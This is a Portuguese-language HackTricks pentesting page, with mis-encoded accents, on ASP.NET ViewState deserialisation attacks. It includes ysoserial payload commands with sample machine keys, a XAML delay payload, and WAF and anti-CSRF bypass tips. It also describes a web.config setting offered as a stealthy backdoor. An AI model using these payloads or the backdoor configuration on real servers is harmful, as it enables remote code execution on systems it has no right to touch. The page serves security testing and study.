<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**O conte√∫do deste post foi extra√≠do de** [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

# Introdu√ß√£o

As aplica√ß√µes web ASP.NET usam o ViewState para manter o estado de uma p√°gina e persistir dados em um formul√°rio web.

Normalmente, √© poss√≠vel **executar c√≥digo em um servidor web onde um ViewState v√°lido pode ser forjado**. Isso pode ser feito quando a funcionalidade de **valida√ß√£o MAC** foi **desativada** ou conhecendo:

* **Chave de valida√ß√£o e seu algoritmo** **antes** da vers√£o do .NET Framework **4.5**
* **Chave de valida√ß√£o, algoritmo de valida√ß√£o, chave de descriptografia e algoritmo de descriptografia** na vers√£o do .NET Framework 4.5 ou superior

Para evitar ataques de manipula√ß√£o, o .NET Framework pode **assinar e criptografar** o ViewState que foi serializado usando a classe `LosFormatter`. Em seguida, verifica a assinatura usando o mecanismo de valida√ß√£o de c√≥digo de autentica√ß√£o de mensagem (MAC). A classe `ObjectStateFormatter` realiza as tarefas de assinatura, criptografia e verifica√ß√£o. As **chaves necess√°rias para executar o mecanismo de assinatura e/ou criptografia** podem ser armazenadas na se√ß√£o `machineKey` dos arquivos **`web.config`** (n√≠vel de aplicativo) ou **`machine.config`** (n√≠vel de m√°quina). Isso √© normalmente o caso quando v√°rios servidores web s√£o usados para servir a mesma aplica√ß√£o, muitas vezes atr√°s de um balanceador de carga em uma fazenda ou cluster da Web. O seguinte mostra o formato da se√ß√£o `machineKey` em um arquivo de configura√ß√£o de uma aplica√ß√£o ASP.NET que usa a vers√£o do .NET Framework 2.0 ou superior:
```markup
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="SHA1" decryption="AES"  />
```
√â importante notar que quando a se√ß√£o `machineKey` n√£o foi definida nos arquivos de configura√ß√£o ou quando os atributos `validationKey` e `decryptionKey` foram definidos como `AutoGenerate`, **a aplica√ß√£o gera os valores necess√°rios dinamicamente** com base em um segredo criptograficamente aleat√≥rio. Os algoritmos tamb√©m podem ser selecionados automaticamente. Atualmente, na vers√£o mais recente do .NET Framework, o algoritmo de valida√ß√£o padr√£o √© `HMACSHA256` e o algoritmo de descriptografia padr√£o √© `AES`. Consulte [\[13\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection) para mais detalhes.

# RCE com valida√ß√£o de ViewState MAC desativada

No passado, era poss√≠vel **desativar a valida√ß√£o do MAC** simplesmente definindo a propriedade `enableViewStateMac` como `False`. A Microsoft lan√ßou um patch em setembro de 2014 [\[3\]](https://devblogs.microsoft.com/aspnet/farewell-enableviewstatemac/) para impor a valida√ß√£o do MAC, ignorando essa propriedade em todas as vers√µes do .NET Framework. Embora alguns de n√≥s possam acreditar que "_o ViewState MAC n√£o pode mais ser desativado_" [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET), ainda √© poss√≠vel desativar a fun√ß√£o de valida√ß√£o do MAC definindo a chave do registro `AspNetEnforceViewStateMac` como zero em:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
Alternativamente, adicionar a seguinte **configura√ß√£o perigosa** ao arquivo `web.config` de n√≠vel de aplicativo pode desativar a valida√ß√£o MAC tamb√©m:
```markup
<configuration>
‚Ä¶
    <appSettings>
      <add key="aspnet:AllowInsecureDeserialization" value="true" />
    </appSettings>
</configuration>
```
{% hint style="danger" %}
Quando a valida√ß√£o MAC do ViewState foi **desativada**, o projeto [YSoSerial.Net](https://github.com/pwntester/ysoserial.net) pode ser usado para gerar payloads `LosFormatter` como o ViewState para executar c√≥digo arbitr√°rio no servidor.
{% endhint %}

**Antes** da vers√£o do .NET Framework **4.5**, o par√¢metro `__VIEWSTATE` poderia ser **criptografado enquanto a valida√ß√£o MAC estava desativada**. Deve-se notar que **a maioria** dos **scanners** **n√£o tenta** enviar um par√¢metro ViewState n√£o criptografado para identificar essa vulnerabilidade. Como resultado, √© necess√°rio fazer **testes manuais** para verificar se a valida√ß√£o MAC est√° desativada quando o par√¢metro `__VIEWSTATE` foi criptografado. Isso pode ser verificado enviando uma pequena string aleat√≥ria em base64 no par√¢metro `__VIEWSTATE`. A URL a seguir mostra um exemplo:
```
https://victim.com/path/page.aspx?__VIEWSTATE=AAAA
```
Se a p√°gina alvo **responder com um erro, a valida√ß√£o MAC foi desativada**, caso contr√°rio, teria suprimido a mensagem de erro de valida√ß√£o MAC.\
No entanto, em cen√°rios em que voc√™ n√£o pode ver a mensagem de erro, esse truque n√£o funcionar√°.

Os scanners automatizados devem usar uma **carga √∫til que cause um curto atraso** no lado do servidor. Isso pode ser alcan√ßado executando o seguinte c√≥digo ASP.NET, por exemplo, para criar um atraso de 10 segundos:
```
System.Threading.Thread.Sleep(10000);
```

```bash
string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Thr=""clr-namespace:System.Threading;assembly=mscorlib"">
     <ObjectDataProvider x:Key=""x"" ObjectType = ""{ x:Type Thr:Thread}"" MethodName = ""Sleep"" >
     <ObjectDataProvider.MethodParameters>
        <System:Int32>10000</System:Int32>
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
```
# RCE com Valida√ß√£o de MAC ViewState ativada

Em vers√µes mais antigas (**anteriores √† 4.5**), o Framework .NET usa a propriedade **`TemplateSourceDirectory`** [\[15\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.control.templatesourcedirectory) ao **assinar** um objeto serializado. **Desde** a vers√£o **4.5**, no entanto, ele usa as strings **`Purpose`** para criar o hash. Ambos os mecanismos **exigem o caminho de destino a partir do diret√≥rio raiz do aplicativo** e o **nome da p√°gina**. Esses par√¢metros podem ser **extra√≠dos da URL**.

Aplica√ß√µes que usam um **framework mais antigo** e imp√µem a criptografia do ViewState ainda podem **aceitar um ViewState assinado sem criptografia**. Isso significa que **conhecer a chave de valida√ß√£o e seu algoritmo √© suficiente** para explorar um site. Parece que o ViewState √© criptografado por padr√£o **desde a vers√£o 4.5**, mesmo quando a propriedade `viewStateEncryptionMode` foi definida como `Never`. Isso significa que nas √∫ltimas vers√µes do Framework .NET, a **chave de descriptografia e seu algoritmo tamb√©m s√£o necess√°rios** para criar um payload.

O ViewState ASP.NET cont√©m uma propriedade chamada `ViewStateUserKey` [\[16\]](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972969\(v=msdn.10\)) que pode ser usada para mitigar os riscos de ataques de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET). O valor da propriedade **`ViewStateUserKey`** (quando n√£o √© `null`**) tamb√©m √© usado durante o processo de assinatura do ViewState**. Embora n√£o conhecer o valor desse par√¢metro possa interromper nosso ataque, **seu valor geralmente pode ser encontrado nos cookies ou em um par√¢metro de entrada oculto** ([\[17\]](https://software-security.sans.org/developer-how-to/developer-guide-csrf) mostra um exemplo implementado).

## Plugins ViewState YSoSerial.Net

No YSoSerial.Net master e no YSoSerial.Netv2, voc√™ pode encontrar um plugin ([**este**](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs) e [**este**](https://github.com/pwntester/ysoserial.net/blob/v2/ysoserial/Plugins/ViewStatePlugin.cs)) para explorar essa t√©cnica quando todas as informa√ß√µes s√£o conhecidas.

### **Para o Framework .NET >= 4.5:**
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
### **Para .NET Framework <= 4.0 (legado):**

_A chave de descriptografia e seu algoritmo n√£o s√£o necess√°rios aqui:_
```bash
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
```
_Al√©m de usar diferentes gadgets, √© poss√≠vel usar o par√¢metro `__VIEWSTATEGENERATOR` **em vez de fornecer os caminhos**:_
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
Por padr√£o, ele usa o gadget ActivitySurrogateSelector que requer a compila√ß√£o da classe ExploitClass.cs no projeto YSoSerial.Net. A carga √∫til do ViewState tamb√©m pode ser **criptografada** para evitar os WAFs quando o valor decryptionKey √© conhecido:
```bash
.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
{% hint style="info" %}
**Nota:** Devido √† natureza dos gadgets usados no YSoSerial.Net, a p√°gina ASP.NET alvo sempre responde com um erro, mesmo quando um exploit foi executado com sucesso no lado do servidor.
{% endhint %}

### Caminho da aplica√ß√£o

√â importante encontrar a raiz do caminho da aplica√ß√£o para criar um ViewState v√°lido, a menos que:

* A aplica√ß√£o use a vers√£o do .NET Framework 4.0 ou abaixo; e
* O par√¢metro `__VIEWSTATEGENERATOR` seja conhecido.

A seguinte captura de tela mostra a √°rvore de caminhos no IIS:

![](https://soroush.secproject.com/downloadable/images/aspnetviewstate/iis.png)

Voc√™ pode verificar [\[20\]](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis) se n√£o estiver familiarizado com os termos de diret√≥rio virtual e aplica√ß√£o no IIS.

Para gerar um ViewState para a URL acima, os argumentos `--path` e `--apppath` devem ser os seguintes:
```
--path=/dir1/vDir1/dir2/app1/dir3/app2/vDir2/dir4
--apppath=/app2/ 
```
Se n√£o soub√©ssemos que "app2" era um nome de aplicativo, poder√≠amos usar **tentativa e erro para testar todos os nomes de diret√≥rio** na URL um por um at√© encontrar um ViewState que possa executar c√≥digo no servidor (talvez obtendo uma solicita√ß√£o DNS ou causando um atraso).

### Gerador

Nesse caso, o argumento `--generator` pode ser usado. O argumento `--isdebug` pode ser usado para verificar se o plugin tamb√©m calcula o mesmo par√¢metro `__VIEWSTATEGENERATOR` quando os argumentos `--path` e `--apppath` foram fornecidos.

## Explorando vers√µes mais antigas

Nenhum gadget foi identificado para explorar o .NET Framework v1.1 no momento em que este post foi escrito.

Para explorar aplicativos que usam o .NET Framework v4.0 ou abaixo, pode ser usado o ramo YSoSerial.Net v2.0 [\[21\]](https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/tree/master/ysoserial.net-v2) (originalmente desenvolvido como parte de outra pesquisa [\[22\]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)). No entanto, este projeto suporta apenas um n√∫mero limitado de gadgets e tamb√©m requer que a caixa de destino tenha o .NET Framework 3.5 ou superior instalado.

## **Outras ferramentas**

Parece que o Immunity Canvas suporta a cria√ß√£o do par√¢metro ViewState quando as chaves de valida√ß√£o e criptografia s√£o conhecidas [\[29\]](https://vimeopro.com/user18478112/canvas/video/260982761). As seguintes ferramentas tamb√©m foram lan√ßadas coincidentemente na mesma √©poca em que eu estava prestes a publicar meu trabalho, o que foi bastante surpreendente:

* [https://github.com/0xACB/viewgen](https://github.com/0xACB/viewgen) (escrito em Python)
* [https://github.com/Illuminopi/RCEvil.NET](https://github.com/Illuminopi/RCEvil.NET) (escrito em .NET)

Acredito que essas ferramentas atualmente **n√£o diferenciam entre diferentes vers√µes do** Framework .NET e visam a criptografia legada. Al√©m disso, eles **n√£o usam o par√¢metro `ViewStateUserKey`** que pode estar em uso para impedir ataques CSRF.

# Dicas adicionais

## **Usando solicita√ß√µes GET**

Tamb√©m √© poss√≠vel enviar o par√¢metro `__VIEWSTATE` na URL por meio de uma solicita√ß√£o GET. O √∫nico fator limitante √© o comprimento da URL que limita o tipo de gadgets que podem ser usados aqui.

## **Criptografia no Framework .NET anterior √† vers√£o 4.5**

Como mencionado anteriormente, o par√¢metro `__VIEWSTATE` n√£o precisa ser criptografado ao explorar o Framework .NET 4.0 e abaixo (testado na vers√£o 2.0 at√© a vers√£o 4.0), mesmo quando a propriedade `ViewStateEncryptionMode` foi definida como `Always`. O ASP.NET decide se o ViewState foi criptografado ou n√£o, encontrando o par√¢metro `__VIEWSTATEENCRYPTED` na solicita√ß√£o (n√£o precisa ter nenhum valor). Portanto, √© poss√≠vel enviar um ViewState n√£o criptografado removendo o par√¢metro `__VIEWSTATEENCRYPTED` da solicita√ß√£o.

Isso tamb√©m significa que a altera√ß√£o da chave de descriptografia ou seu algoritmo n√£o pode impedir os ataques quando a chave de valida√ß√£o e seu algoritmo foram roubados.

O par√¢metro `__VIEWSTATE` pode ser criptografado para contornar quaisquer WAFs.

## **Contornando o mecanismo anti-CSRF (anti-XSRF)**

Uma p√°gina ASP.NET produz um erro quando um par√¢metro `__VIEWSTATE` inv√°lido √© usado. No entanto, a p√°gina ainda pode receber suas entradas quando `Request.Form` √© usado diretamente no c√≥digo, por exemplo, usando `Request.Form["txtMyInput"]` em vez de `txtMyInput.Text`. **O ataque CSRF pode ser realizado removendo o par√¢metro `__VIEWSTATE` da solicita√ß√£o ou adicionando o par√¢metro `__PREVIOUSPAGE` com um valor inv√°lido**. Como o par√¢metro `__PREVIOUSPAGE` √© criptografado e formatado em base64 por padr√£o, mesmo fornecer um √∫nico caractere como seu valor deve causar um erro.

Isso pode resultar em contornar o mecanismo de prote√ß√£o anti-CSRF que foi implementado definindo o par√¢metro `Page.ViewStateUserKey`.

## **Uso do par√¢metro ViewStateGenerator**

Quando o par√¢metro `__VIEWSTATEGENERATOR` √© conhecido, ele pode ser usado para os aplicativos ASP.NET que usam a vers√£o 4.0 ou abaixo do Framework .NET para assinar um objeto serializado sem conhecer o caminho do aplicativo.

## **Divis√£o do ViewState para contornar WAFs**

√â poss√≠vel dividir o par√¢metro `__VIEWSTATE` em v√°rias partes quando a propriedade **`MaxPageStateFieldLength`** foi definida como um **valor positivo**. Seu valor **padr√£o** √© **negativo** e significa que o par√¢metro **`__VIEWSTATE`** **n√£o pode ser dividido em v√°rias partes**.

Isso pode ser √∫til para contornar alguns WAFs quando a divis√£o do ViewState √© permitida.

## **Explorando o par√¢metro EventValidation**

O par√¢metro `__EVENTVALIDATION` e alguns outros par√¢metros tamb√©m s√£o serializados de forma semelhante ao par√¢metro `__VIEWSTATE` e podem ser direcionados da mesma forma. Explorar um problema de desserializa√ß√£o via `__EVENTVALIDATION` √© mais restrito e requer:

* Uma solicita√ß√£o POST
* Uma p√°gina ASP.NET que aceita par√¢metros de entrada
* Um nome de par√¢metro de entrada v√°lido. Por exemplo, o par√¢metro `myinput` na solicita√ß√£o POST quando temos o seguinte c√≥digo no lado do servidor:
```markup
<asp:TextBox runat="server" ID="myinput" />
```
O valor do par√¢metro `__VIEWSTATE` pode estar vazio na solicita√ß√£o ao explorar o par√¢metro `__EVENTVALIDATION`, mas ele precisa existir.

A string `Purpose` usada pelo .NET Framework 4.5 e superior para criar uma assinatura v√°lida √© diferente com base no par√¢metro usado. A tabela a seguir mostra as strings `Purpose` definidas no .NET Framework:

| **Par√¢metro de entrada**                                     | **String Purpose**                                 |
| ------------------------------------------------------------ | -------------------------------------------------- |
| ‚Äú\_\_VIEWSTATE‚Äù                                              | WebForms.HiddenFieldPageStatePersister.ClientState |
| ‚Äú\_\_EVENTVALIDATION‚Äù                                        | WebForms.ClientScriptManager.EventValidation       |
| P2 em P1\|P2 em ‚Äú\_\_dv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù           | WebForms.DetailsView.KeyTable                      |
| P4 em P1\|P2\|P3\|P4 em ‚Äú\_\_CALLBACKPARAM‚Äù                  | WebForms.DetailsView.KeyTable                      |
| P3 em P1\|P2\|P3\|P4 em ‚Äú\_\_gv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù   | WebForms.GridView.SortExpression                   |
| P4 em P1\|P2\|P3\|P4 em ‚Äú\_\_gv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù   | WebForms.GridView.DataKeys                         |

A tabela acima mostra todos os par√¢metros de entrada que podem ser visados.

## **Cuidado com o par√¢metro PreviousPage**

Quando o par√¢metro **`__PREVIOUSPAGE`** existe na solicita√ß√£o com dados **inv√°lidos**, a **aplica√ß√£o** **n√£o** **desserializa** o par√¢metro **`__VIEWSTATE`**. Fornecer o par√¢metro `__CALLBACKID` impede esse comportamento.

## **Confiabilidade de erros**

Como explicado anteriormente, √†s vezes usamos erros para verificar se um ViewState gerado √© v√°lido. O ASP.NET n√£o mostra o erro de valida√ß√£o MAC por padr√£o quando um par√¢metro `__VIEWSTATEGENERATOR` inv√°lido √© usado. Esse comportamento muda quando a propriedade `ViewStateUserKey` √© usada, pois o ASP.NET n√£o suprime mais os erros de valida√ß√£o MAC.

Al√©m disso, as aplica√ß√µes web ASP.NET podem ignorar os erros de valida√ß√£o MAC com a seguinte configura√ß√£o, mesmo quando a propriedade `ViewStateUserKey` √© usada:
```markup
<appSettings>
      <add key="aspnet:AlwaysIgnoreViewStateValidationErrors" value="true" />
</appSettings>
```
# Web.config como uma porta dos fundos

Se os atacantes puderem **alterar** o arquivo **`web.config`** na raiz de uma aplica√ß√£o, eles podem **executar facilmente c√≥digo** no servidor. No entanto, incorporar uma porta dos fundos furtiva na aplica√ß√£o pode ser uma boa escolha para um atacante. Isso pode ser feito **desabilitando a valida√ß√£o MAC** e definindo a propriedade `viewStateEncryptionMode` como `Always`. Isso significa que todas as p√°ginas ASP.NET que n√£o definem a propriedade `ViewStateEncryptionMode` como `Auto` ou `Never` sempre usam par√¢metros ViewState criptografados. No entanto, como o **ViewState n√£o usa o recurso de valida√ß√£o MAC, eles agora est√£o vulner√°veis √† execu√ß√£o remota de c√≥digo por meio da desserializa√ß√£o de dados n√£o confi√°veis**. O seguinte mostra um exemplo:
```markup
<configuration>
‚Ä¶
    <system.web>
‚Ä¶
        <pages enableViewStateMac="false" viewStateEncryptionMode="Always" />
    </system.web>
    <appSettings>
        <add key="aspnet:AllowInsecureDeserialization" value="false" />
    </appSettings>
</configuration>
```
Outra op√ß√£o para um site independente seria definir a se√ß√£o `machineKey` com chaves e algoritmos arbitr√°rios para impedir outros atacantes!

Deve-se notar que definir a propriedade `EnableViewState` como `False` n√£o impede esse ataque, pois o ViewState ainda ser√° analisado pelo ASP.NET.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
